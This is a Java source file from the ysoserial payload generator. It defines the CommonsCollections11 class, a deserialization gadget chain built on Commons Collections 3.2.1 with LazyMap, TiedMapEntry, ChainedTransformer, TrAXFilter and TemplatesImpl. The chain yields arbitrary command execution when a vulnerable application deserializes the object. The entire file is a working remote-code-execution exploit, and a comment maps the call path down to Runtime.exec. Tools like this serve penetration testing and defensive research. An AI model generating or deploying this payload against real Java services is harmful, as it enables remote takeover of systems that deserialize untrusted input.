package ysoserial.payloads;

import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.Map;

import javax.xml.transform.Templates;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

//import org.apache.commons.collections.map.DefaultedMap;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.JavaVersion;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;

//java.io.ObjectInputStream.readObject()//cc6
//	java.util.HashMap.readObject()
//		java.util.HashMap.hash()
//			org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
//			org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
//				org.apache.commons.collections.map.DefaultedMap.get()
//                  ChainedTransformer.transform()//cc3
//                     ConstantTransformer.transform()
//                     InstantiateTransformer.transform()
//                     		  TemplatesImpl.newTransformer()
//                              TemplatesImpl.getTransletInstance()
//                              TemplatesImpl.defineTransletClasses()
//                                    	newInstance()
//											Method.invoke()
//												Runtime.exec()
@SuppressWarnings({"rawtypes", "unchecked", "restriction"})
@PayloadTest(precondition = "isApplicableJavaVersion")
@Dependencies({"commons-collections:commons-collections:3.2.1"})
public class CommonsCollections11 extends PayloadRunner implements ObjectPayload<Object> {

    public Object getObject(final String command) throws Exception {
        Object templatesImpl = Gadgets.createTemplatesImpl(command);

        Transformer[] transformer = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templatesImpl})
        };
        Transformer transformerChain = new ChainedTransformer(
            new Transformer[]{new ConstantTransformer(1)});
        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);
//        Map outerMap = DefaultedMap.decorate(innerMap, transformerChain);
        //DefaultedMap可以不用remove
        TiedMapEntry tme = new TiedMapEntry(outerMap, "keykey");
        Map expMap = new HashMap();
        expMap.put(tme, "valuevalue");
        outerMap.remove("keykey");
        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerChain, transformer);
        return expMap;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsCollections11.class, args);
//        new CommonsCollections11().getObject("calc");
    }
}
